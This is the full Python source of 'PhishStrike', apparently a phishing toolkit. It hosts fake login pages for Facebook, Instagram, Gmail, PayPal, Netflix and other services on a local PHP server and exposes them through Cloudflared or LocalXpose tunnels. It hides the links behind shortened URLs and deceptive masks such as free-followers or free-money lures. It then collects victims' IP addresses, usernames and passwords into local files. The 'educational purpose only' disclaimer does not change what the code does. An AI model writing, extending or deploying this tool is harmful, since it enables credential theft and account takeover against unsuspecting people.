#!/usr/bin/env python3
import os
import sys
import time
import shutil
import urllib.request
import subprocess
import signal
import platform
import zipfile
import tarfile
import re
import json

if sys.stdout.encoding != "utf-8":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except AttributeError:
        pass

__version__ = "2.3.5"

HOST = "127.0.0.1"
PORT = "8080"

# ANSI colors – Cyber Dashboard Bold Theme
LIGHT1 = "\033[1;38;2;0;255;255m"  # Neon Cyan (Bold)
LIGHT2 = "\033[1;38;2;30;144;255m"  # Electric Blue (Bold)
MEDIUM = "\033[1;38;2;0;102;204m"  # Deep Azure (Bold)
PURPLE = "\033[1;38;2;157;0;255m"  # Neon Purple (Bold)
DARK = "\033[1;38;2;80;80;80m"  # Graphite (Bold)
PINK = "\033[1;38;2;255;45;170m"  # Neon Pink (Bold)
RED = "\033[1;38;2;255;50;50m"  # Cyber Red (Bold)
RESET = "\033[0m"
WHITE = "\033[1;97m"  # Pure White (Bold)
BOLD = "\033[1m"


BASE_DIR = os.path.dirname(os.path.realpath(__file__))

# globals for settings
website = ""
mask = ""


def reset_color():
    sys.stdout.write(RESET + "\n")
    sys.stdout.flush()


def sig_handler(sig, frame):
    print(f"\n\n{DARK}[{WHITE}!{DARK}]{DARK} Program Interrupted.")
    reset_color()
    sys.exit(0)


signal.signal(signal.SIGINT, sig_handler)
signal.signal(signal.SIGTERM, sig_handler)


def setup_env():
    if not os.path.isdir(".server"):
        os.makedirs(".server")
    if not os.path.isdir("auth"):
        os.makedirs("auth")
    if os.path.isdir(".server/www"):
        shutil.rmtree(".server/www")
    os.makedirs(".server/www")

    if os.path.exists(".server/.loclx"):
        os.remove(".server/.loclx")
    if os.path.exists(".server/.cld.log"):
        os.remove(".server/.cld.log")


def kill_pid():
    if platform.system() == "Windows":
        os.system("taskkill /F /IM php.exe >nul 2>&1")
        os.system("taskkill /F /IM cloudflared.exe >nul 2>&1")
        os.system("taskkill /F /IM loclx.exe >nul 2>&1")
    else:
        for p in ["php", "cloudflared", "loclx"]:
            os.system(f"killall {p} > /dev/null 2>&1")


def check_update():
    print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Checking for update : ", end="")
    try:
        req = urllib.request.Request(
            "https://api.github.com/repos/farouqshaheen/PhishStrike/releases/latest",
            headers={"User-Agent": "Mozilla/5.0"},
        )
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode("utf-8"))
            new_version = data.get("tag_name", "").strip()
            if new_version and new_version != __version__:
                print(f"{LIGHT2}update found\n{LIGHT1}")
                time.sleep(2)
                print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Downloading Update...")
                tarball_url = f"https://github.com/farouqshaheen/PhishStrike/archive/refs/tags/{new_version}.tar.gz"
                # For simplicity, we just prompt the user
                print(
                    f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Please manually pull the latest version or download from {tarball_url}"
                )
            else:
                print(f"{PURPLE}up to date\n{LIGHT1}")
                time.sleep(0.5)
    except Exception:
        print(f"{DARK}Offline{LIGHT1}")


def check_status():
    print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Internet Status : ", end="")
    try:
        urllib.request.urlopen("https://api.github.com", timeout=3)
        print(f"{PURPLE}Online{LIGHT1}")
        check_update()
    except Exception:
        print(f"{DARK}Offline{LIGHT1}")


def banner():
    print(
        f"""{LIGHT1}  
    {LIGHT2} ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
    {LIGHT2} ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
    {LIGHT1} ██████╔╝███████║██║███████╗███████║███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  
    {LIGHT1} ██╔═══╝ ██╔══██║██║╚════██║██╔══██║╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
    {MEDIUM} ██║     ██║  ██║██║███████║██║  ██║███████║   ██║   ██║  ██║██║██║  ██╗███████╗
    {MEDIUM} ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
    {PURPLE} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    {PURPLE} [{LIGHT1}-{PURPLE}] {PINK}Cyber Security Dashboard | Developed by Farouq Shaheen & Lujain Ghatasheh{RESET}"""
    )


def banner_small():
    print(f"""
    {PURPLE} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    {LIGHT2} \x5b {LIGHT1}P H I S H S T R I K E {LIGHT2} \x5d {DARK}| {MEDIUM}PHISH STRIKE DASHBOARD
    {PURPLE} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")


def dependencies():
    print(f"\n    {PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Validating environment...")

    # Check for PHP (Hard dependency)
    php_path = shutil.which("php") or shutil.which("php.exe")

    if php_path is None:
        print(f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} CRITICAL ERROR: PHP NOT FOUND!")
        print(
            f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT2} PHP is required to run the local phishing server."
        )
        print(
            f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT2} Please install PHP and add it to your PATH."
        )
        if platform.system() != "Windows":
            print(
                f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT1} Hint: Run 'sudo apt install php' (for Debian/Ubuntu)"
            )
        else:
            print(
                f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT1} Download: https://www.php.net/downloads.php"
            )
        print()
        sys.exit(1)

    return php_path


def download(url, output):
    file_name = os.path.basename(url)
    if os.path.exists(file_name):
        os.remove(file_name)
    if os.path.exists(output):
        os.remove(output)
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req) as response, open(file_name, "wb") as out_file:
            shutil.copyfileobj(response, out_file)

        if file_name.endswith(".zip"):
            with zipfile.ZipFile(file_name, "r") as zip_ref:
                zip_ref.extractall()
            os.rename(
                zip_ref.namelist()[0] if output not in file_name else output,
                f".server/{output}",
            )
        elif file_name.endswith(".tgz") or file_name.endswith(".tar.gz"):
            with tarfile.open(file_name, "r:gz") as tar_ref:
                tar_ref.extractall()
            os.rename(file_name.replace(".tgz", ""), f".server/{output}")
        else:
            shutil.move(file_name, f".server/{output}")

        if not platform.system() == "Windows":
            os.chmod(f".server/{output}", 0o755)

        if os.path.exists(file_name):
            os.remove(file_name)
    except Exception as e:
        print(
            f"\n{DARK}[{WHITE}!{DARK}]{DARK} Error occurred while downloading {output}."
        )
        reset_color()
        sys.exit(1)


def install_cloudflared():
    if os.path.exists(".server/cloudflared") or os.path.exists(
        ".server/cloudflared.exe"
    ):
        print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{PURPLE} Cloudflared already installed.")
    else:
        print(
            f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Installing Cloudflared...{LIGHT1}"
        )
        arch = platform.machine().lower()
        if platform.system() == "Windows":
            download(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe",
                "cloudflared.exe",
            )
        elif "arm" in arch or "aarch64" in arch:
            download(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64",
                "cloudflared",
            )
        elif "x86_64" in arch or "amd64" in arch:
            download(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
                "cloudflared",
            )
        else:
            download(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386",
                "cloudflared",
            )


def install_localxpose():
    if os.path.exists(".server/loclx") or os.path.exists(".server/loclx.exe"):
        print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{PURPLE} LocalXpose already installed.")
    else:
        print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Installing LocalXpose...{LIGHT1}")
        arch = platform.machine().lower()
        if platform.system() == "Windows":
            download(
                "https://api.localxpose.io/api/v2/downloads/loclx-windows-amd64.zip",
                "loclx.exe",
            )
        elif "arm" in arch or "aarch64" in arch:
            download(
                "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip",
                "loclx",
            )
        elif "x86_64" in arch or "amd64" in arch:
            download(
                "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip",
                "loclx",
            )
        else:
            download(
                "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip",
                "loclx",
            )


def msg_exit():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"\n{PURPLE}{DARK} Thank you for using this tool. Have a good day.{RESET}\n")
    reset_color()
    sys.exit(0)


def about():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"""
{PURPLE} ╭───{LIGHT1} [ Farouq Shaheen ] {PURPLE}───────────────────────────────────────
{PURPLE} │ {LIGHT2}Github {DARK}: {LIGHT1}https://github.com/farouqshaheen
{PURPLE} │ {LIGHT2}Social {DARK}: {LIGHT1}https://www.linkedin.com/in/farouq-shaheen-667b24305/
{PURPLE} ╰───────────────────────────────────────────────────────────

{PURPLE} ╭───{LIGHT1} [ Lujain Ghatasheh ] {PURPLE}─────────────────────────────────────
{PURPLE} │ {LIGHT2}Github {DARK}: {LIGHT1}https://github.com/LujainGhatasheh
{PURPLE} │ {LIGHT2}Social {DARK}: {LIGHT1}https://www.linkedin.com/in/lujain-ghatasheh-7a25a5344/
{PURPLE} ╰───────────────────────────────────────────────────────────

{RED} Warning:{RESET}
{RED}  This Tool is made for educational purpose 
  only ! Authors will not be responsible for 
  any misuse of this toolkit !{RESET}

""")
    print(
        f"    {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Main Menu     {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} Exit\n"
    )
    reply = input(
        f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD} "
    )
    if reply in ["99"]:
        msg_exit()
    elif reply in ["0", "00"]:
        print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Returning to main menu...")
        time.sleep(1)
        main_menu()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        about()


def cusport():
    global PORT
    print()
    ans = input(
        f"{DARK}[{WHITE}?{DARK}]{LIGHT2} Do You Want A Custom Port {PURPLE}[{LIGHT2}y{PURPLE}/{LIGHT2}N{PURPLE}]: {LIGHT2}"
    )
    if ans.lower() == "y":
        print("\n")
        cu_p = input(
            f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Enter Your Custom 4-digit Port [1024-9999] : {LIGHT1}"
        )
        if cu_p.isdigit() and 1024 <= int(cu_p) <= 9999:
            PORT = cu_p
            print()
        else:
            print(
                f"\n\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid 4-digit Port : {cu_p}, Try Again...{LIGHT1}"
            )
            time.sleep(2)
            os.system("cls" if os.name == "nt" else "clear")
            banner_small()
            cusport()
    else:
        print(
            f"\n\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Using Default Port {PORT}...{LIGHT1}\n"
        )


def setup_site():
    print(f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{MEDIUM} Setting up server...{LIGHT1}")
    site_dir = os.path.join(".sites", website)
    if not os.path.isdir(site_dir):
        print(
            f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} Error: Site directory {website} not found!"
        )
        return

    for item in os.listdir(site_dir):
        s = os.path.join(site_dir, item)
        d = os.path.join(".server/www", item)
        if os.path.isdir(s):
            shutil.copytree(s, d, dirs_exist_ok=True)
        else:
            shutil.copy2(s, d)

    shutil.copy2(".sites/ip.php", ".server/www/ip.php")

    php_bin = shutil.which("php") or shutil.which("php.exe")
    if not php_bin:
        print(
            f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} PHP binary lost! Re-check your installation."
        )
        sys.exit(1)

    print(f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{MEDIUM} Starting PHP server...{LIGHT1}")
    subprocess.Popen(
        [php_bin, "-S", f"{HOST}:{PORT}"],
        cwd=".server/www",
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def capture_ip():
    if os.path.exists(".server/www/ip.txt"):
        with open(".server/www/ip.txt", "r") as f:
            lines = f.readlines()
        ip = ""
        for line in lines:
            if "IP: " in line:
                ip = line.split("IP: ")[1].strip()
        print(f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Victim's IP : {WHITE}{ip}")
        print(
            f"    {DARK}\x5b{WHITE}-{DARK}\x5d{MEDIUM} Saved in    : {LIGHT2}auth/ip.txt"
        )
        with open("auth/ip.txt", "a") as f:
            f.writelines(lines)


def capture_creds():
    if os.path.exists(".server/www/usernames.txt"):
        with open(".server/www/usernames.txt", "r") as f:
            lines = f.readlines()
        account = ""
        password = ""
        for line in lines:
            if "Username:" in line:
                account = line.split("Username:")[1].strip()
            if "Pass:" in line:
                password = line.split("Pass:")[1].split(".")[-1].strip()
        print(f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Account : {MEDIUM}{account}")
        print(f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Password : {MEDIUM}{password}")
        print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Saved in : {LIGHT2}auth/usernames.dat")
        with open("auth/usernames.dat", "a") as f:
            f.writelines(lines)
        print(
            f"\n{DARK}[{WHITE}-{DARK}]{LIGHT2} Waiting for Next Login Info, {MEDIUM}Ctrl + C {LIGHT2}to exit. ",
            end="",
        )


def capture_data():
    print(
        f"\n{DARK}[{WHITE}-{DARK}]{LIGHT2} Waiting for Login Info, {MEDIUM}Ctrl + C {LIGHT2}to exit..."
    )
    try:
        while True:
            if os.path.exists(".server/www/ip.txt"):
                print(f"\n\n{DARK}[{WHITE}-{DARK}]{PURPLE} Victim IP Found !")
                capture_ip()
                os.remove(".server/www/ip.txt")
            time.sleep(0.75)
            if os.path.exists(".server/www/usernames.txt"):
                print(f"\n\n{DARK}[{WHITE}-{DARK}]{PURPLE} Login info Found !!")
                capture_creds()
                os.remove(".server/www/usernames.txt")
            time.sleep(0.75)
    except KeyboardInterrupt:
        pass


def custom_mask():
    global mask
    time.sleep(0.5)
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    print()
    mask_op = input(
        f"{DARK}[{WHITE}?{DARK}]{LIGHT2} Do you want to change Mask URL? {PURPLE}[{LIGHT2}y{PURPLE}/{LIGHT2}N{PURPLE}] :{LIGHT2} "
    )
    print()
    if mask_op.lower() == "y":
        print(
            f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Enter your custom URL below {LIGHT2}({LIGHT2}Example: https://get-free-followers.com{LIGHT2})\n"
        )
        mask_url = input(f"{LIGHT1} ==> {LIGHT2}")
        if mask_url == "":
            mask_url = "https://"
        if mask_url.startswith("http") or mask_url.startswith("www"):
            mask = mask_url
            print(
                f"\n{DARK}[{WHITE}-{DARK}]{LIGHT2} Using custom Masked Url :{PURPLE} {mask}"
            )
        else:
            print(
                f"\n{DARK}[{WHITE}!{DARK}]{LIGHT2} Invalid url type..Using the Default one.."
            )


def site_stat(url):
    try:
        urllib.request.urlopen(url + "https://github.com", timeout=3)
        return True
    except Exception:
        return False


def shorten(api, url):
    try:
        req = urllib.request.Request(api + url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req) as response:
            data = response.read().decode("utf-8")
            if "shrtco.de" in api:
                js = json.loads(data)
                return js.get("result", {}).get("short_link2", "")
            else:
                return data.strip()
    except Exception:
        return ""


def custom_url(url):
    url = url.replace("http://", "").replace("https://", "")
    isgd = "https://is.gd/create.php?format=simple&url="
    shortcode = "https://api.shrtco.de/v2/shorten?url="
    tinyurl = "https://tinyurl.com/api-create.php?url="

    custom_mask()
    time.sleep(1)
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()

    processed_url = ""
    if "trycloudflare.com" in url or "loclx.io" in url:
        if site_stat(isgd):
            processed_url = shorten(isgd, url)
        elif site_stat(shortcode):
            processed_url = shorten(shortcode, url)
        else:
            processed_url = shorten(tinyurl, url)

        processed_url = processed_url.replace("http://", "").replace("https://", "")
        masked_url = f"{mask}@{processed_url}"
        processed_url = f"https://{processed_url}"
        url = f"https://{url}"
    else:
        url = "Unable to generate links. Try after turning on hotspot"
        processed_url = "Unable to Short URL"
        masked_url = ""

    print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} URL 1 : {PURPLE}{url}")
    print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} URL 2 : {LIGHT2}{processed_url}")
    if "Unable" not in processed_url:
        print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} URL 3 : {LIGHT2}{masked_url}")


def start_cloudflared():
    if os.path.exists(".server/.cld.log"):
        os.remove(".server/.cld.log")
    cusport()
    print(
        f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Initializing... {PURPLE}( {LIGHT2}http://{HOST}:{PORT} {PURPLE})"
    )
    time.sleep(1)
    setup_site()
    print(f"\n\n{DARK}[{WHITE}-{DARK}]{PURPLE} Launching Cloudflared...")

    cld_bin = (
        ".server/cloudflared.exe"
        if platform.system() == "Windows"
        else "./.server/cloudflared"
    )
    with open(".server/.cld.log", "w") as log:
        subprocess.Popen(
            [cld_bin, "tunnel", "-url", f"{HOST}:{PORT}"], stdout=log, stderr=log
        )

    time.sleep(8)
    cldflr_url = ""
    if os.path.exists(".server/.cld.log"):
        with open(".server/.cld.log", "r") as f:
            content = f.read()
            match = re.search(r"https://[-0-9a-z]*\.trycloudflare\.com", content)
            if match:
                cldflr_url = match.group(0)

    custom_url(cldflr_url)
    capture_data()


def localxpose_auth():
    loclx_bin = (
        ".server/loclx.exe" if platform.system() == "Windows" else "./.server/loclx"
    )
    subprocess.Popen(
        [loclx_bin, "-help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(1)

    auth_f = (
        ".localxpose/.access"
        if os.path.isdir(".localxpose")
        else os.path.join(os.path.expanduser("~"), ".localxpose", ".access")
    )
    os.makedirs(os.path.dirname(auth_f), exist_ok=True)

    status = subprocess.run(
        [loclx_bin, "account", "status"], capture_output=True, text=True
    )
    if "Error" in status.stdout or "Error" in status.stderr:
        print(
            f"\n\n{DARK}[{WHITE}!{DARK}]{PURPLE} Create an account on {LIGHT2}localxpose.io{PURPLE} & copy the token\n"
        )
        time.sleep(3)
        loclx_token = input(
            f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Input Loclx Token :{LIGHT2} "
        )
        if not loclx_token:
            print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} You have to input Localxpose Token.")
            time.sleep(2)
            tunnel_menu()
        else:
            with open(auth_f, "w") as f:
                f.write(loclx_token)


def start_loclx():
    cusport()
    print(
        f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Initializing... {PURPLE}( {LIGHT2}http://{HOST}:{PORT} {PURPLE})"
    )
    time.sleep(1)
    setup_site()
    localxpose_auth()

    print("\n")
    opinion = input(
        f"{DARK}[{WHITE}?{DARK}]{LIGHT2} Change Loclx Server Region? {PURPLE}[{LIGHT2}y{PURPLE}/{LIGHT2}N{PURPLE}]:{LIGHT2} "
    )
    loclx_region = "eu" if opinion.lower() == "y" else "us"
    print(f"\n\n{DARK}[{WHITE}-{DARK}]{PURPLE} Launching LocalXpose...")

    loclx_bin = (
        ".server/loclx.exe" if platform.system() == "Windows" else "./.server/loclx"
    )
    with open(".server/.loclx", "w") as log:
        subprocess.Popen(
            [
                loclx_bin,
                "tunnel",
                "--raw-mode",
                "http",
                "--region",
                loclx_region,
                "--https-redirect",
                "-t",
                f"{HOST}:{PORT}",
            ],
            stdout=log,
            stderr=log,
        )

    time.sleep(12)
    loclx_url = ""
    if os.path.exists(".server/.loclx"):
        with open(".server/.loclx", "r") as f:
            content = f.read()
            match = re.search(r"[0-9a-zA-Z.]*\.loclx\.io", content)
            if match:
                loclx_url = match.group(0)

    custom_url(loclx_url)
    capture_data()


def start_localhost():
    cusport()
    print(
        f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Initializing... {PURPLE}( {LIGHT2}http://{HOST}:{PORT} {PURPLE})"
    )
    setup_site()
    time.sleep(1)
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    print(
        f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Successfully Hosted at : {PURPLE}{LIGHT2}http://{HOST}:{PORT} {PURPLE}"
    )
    capture_data()


def tunnel_menu():
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    print(f"""
    {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Localhost
    {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} Cloudflared  {DARK}\x5b{LIGHT2}Auto Detects{DARK}\x5d
    {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} LocalXpose   {DARK}\x5b{LIGHT2}NEW! Max 15Min{DARK}\x5d
    """)
    reply = input(
        f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select a port forwarding service : {MEDIUM}{BOLD} "
    )
    if reply in ["1", "01"]:
        start_localhost()
    elif reply in ["2", "02"]:
        start_cloudflared()
    elif reply in ["3", "03"]:
        start_loclx()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        tunnel_menu()


def site_facebook():
    global website, mask
    print(f"""
{DARK}[{WHITE}01{DARK}]{LIGHT2} Traditional Login Page
{DARK}[{WHITE}02{DARK}]{LIGHT2} Advanced Voting Poll Login Page
{DARK}[{WHITE}03{DARK}]{LIGHT2} Fake Security Login Page
{DARK}[{WHITE}04{DARK}]{LIGHT2} Facebook Messenger Login Page
""")
    reply = input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}")
    if reply in ["1", "01"]:
        website = "facebook"
        mask = "https://blue-verified-badge-for-facebook-free"
        tunnel_menu()
    elif reply in ["2", "02"]:
        website = "fb_advanced"
        mask = "https://vote-for-the-best-social-media"
        tunnel_menu()
    elif reply in ["3", "03"]:
        website = "fb_security"
        mask = "https://make-your-facebook-secured-and-free-from-hackers"
        tunnel_menu()
    elif reply in ["4", "04"]:
        website = "fb_messenger"
        mask = "https://get-messenger-premium-features-free"
        tunnel_menu()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        banner_small()
        site_facebook()


def site_instagram():
    global website, mask
    print(f"""
{DARK}[{WHITE}01{DARK}]{LIGHT2} Traditional Login Page
{DARK}[{WHITE}02{DARK}]{LIGHT2} Auto Followers Login Page
{DARK}[{WHITE}03{DARK}]{LIGHT2} 1000 Followers Login Page
{DARK}[{WHITE}04{DARK}]{LIGHT2} Blue Badge Verify Login Page
""")
    reply = input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}")
    if reply in ["1", "01"]:
        website = "instagram"
        mask = "https://get-unlimited-followers-for-instagram"
        tunnel_menu()
    elif reply in ["2", "02"]:
        website = "ig_followers"
        mask = "https://get-unlimited-followers-for-instagram"
        tunnel_menu()
    elif reply in ["3", "03"]:
        website = "insta_followers"
        mask = "https://get-1000-followers-for-instagram"
        tunnel_menu()
    elif reply in ["4", "04"]:
        website = "ig_verify"
        mask = "https://blue-badge-verify-for-instagram-free"
        tunnel_menu()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        banner_small()
        site_instagram()


def site_gmail():
    global website, mask
    print(f"""
{DARK}[{WHITE}01{DARK}]{LIGHT2} Gmail Old Login Page
{DARK}[{WHITE}02{DARK}]{LIGHT2} Gmail New Login Page
{DARK}[{WHITE}03{DARK}]{LIGHT2} Advanced Voting Poll
""")
    reply = input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}")
    if reply in ["1", "01"]:
        website = "google"
        mask = "https://get-unlimited-google-drive-free"
        tunnel_menu()
    elif reply in ["2", "02"]:
        website = "google_new"
        mask = "https://get-unlimited-google-drive-free"
        tunnel_menu()
    elif reply in ["3", "03"]:
        website = "google_poll"
        mask = "https://vote-for-the-best-social-media"
        tunnel_menu()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        banner_small()
        site_gmail()


def main_menu():
    global website, mask
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"""
    {DARK}\x5b{WHITE}::{DARK}\x5d{LIGHT2} Select An Attack For Your Victim {DARK}\x5b{WHITE}::{DARK}\x5d{LIGHT2}

    {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Facebook      {DARK}\x5b{WHITE}06{DARK}\x5d{LIGHT2} Paypal        {DARK}\x5b{WHITE}11{DARK}\x5d{LIGHT2} Spotify
    {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} Instagram     {DARK}\x5b{WHITE}07{DARK}\x5d{LIGHT2} Snapchat      {DARK}\x5b{WHITE}12{DARK}\x5d{LIGHT2} Reddit
    {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} Google        {DARK}\x5b{WHITE}08{DARK}\x5d{LIGHT2} Linkedin      {DARK}\x5b{WHITE}13{DARK}\x5d{LIGHT2} Quora
    {DARK}\x5b{WHITE}04{DARK}\x5d{LIGHT2} Microsoft     {DARK}\x5b{WHITE}09{DARK}\x5d{LIGHT2} Discord       {DARK}\x5b{WHITE}14{DARK}\x5d{LIGHT2} Adobe
    {DARK}\x5b{WHITE}05{DARK}\x5d{LIGHT2} Netflix       {DARK}\x5b{WHITE}10{DARK}\x5d{LIGHT2} Pinterest     {DARK}\x5b{WHITE}15{DARK}\x5d{LIGHT2} Yandex

    {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} About         {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Exit
    """)
    reply = input(
        f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD} "
    )

    opts = {
        "4": ("microsoft", "https://unlimited-onedrive-space-for-free"),
        "04": ("microsoft", "https://unlimited-onedrive-space-for-free"),
        "5": ("netflix", "https://upgrade-your-netflix-plan-free"),
        "05": ("netflix", "https://upgrade-your-netflix-plan-free"),
        "6": ("paypal", "https://get-500-usd-free-to-your-acount"),
        "06": ("paypal", "https://get-500-usd-free-to-your-acount"),
        "7": ("snapchat", "https://view-locked-snapchat-accounts-secretly"),
        "07": ("snapchat", "https://view-locked-snapchat-accounts-secretly"),
        "8": ("linkedin", "https://get-a-premium-plan-for-linkedin-free"),
        "08": ("linkedin", "https://get-a-premium-plan-for-linkedin-free"),
        "9": ("discord", "https://get-discord-nitro-free"),
        "09": ("discord", "https://get-discord-nitro-free"),
        "10": ("pinterest", "https://get-a-premium-plan-for-pinterest-free"),
        "11": ("spotify", "https://convert-your-account-to-spotify-premium"),
        "12": ("reddit", "https://reddit-official-verified-member-badge"),
        "13": ("quora", "https://quora-premium-for-free"),
        "14": ("adobe", "https://get-adobe-lifetime-pro-membership-free"),
        "15": ("yandex", "https://grab-mail-from-anyother-yandex-account-free"),
    }

    if reply in ["1", "01"]:
        site_facebook()
    elif reply in ["2", "02"]:
        site_instagram()
    elif reply in ["3", "03"]:
        site_gmail()
    elif reply in opts:
        website, mask = opts[reply]
        tunnel_menu()
    elif reply in ["99"]:
        about()
    elif reply in ["0", "00"]:
        msg_exit()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        main_menu()


if __name__ == "__main__":
    kill_pid()
    dependencies()
    check_status()
    setup_env()
    install_cloudflared()
    install_localxpose()
    main_menu()
